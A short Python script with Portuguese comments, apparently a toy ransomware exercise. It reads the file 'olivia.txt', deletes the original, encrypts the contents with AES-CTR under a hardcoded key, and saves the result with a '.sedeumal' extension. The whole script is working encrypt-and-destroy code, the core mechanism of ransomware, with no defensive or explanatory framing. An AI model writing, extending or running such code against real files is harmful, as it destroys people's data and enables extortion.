import os
import pyaes

## Abre o arquivo a ser encriptado

file_name = 'olivia.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remove o arquivo original

os.remove(file_name)

## Define a chave de encriptação 

key = b"brutuspegouolivi"
aes = pyaes.AESModeOfOperationCTR(key)

## Encripta o arquivo

crypto_data = aes.encrypt(file_data)

## Salva o arquivo criptografado

new_file = file_name + '.sedeumal'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()



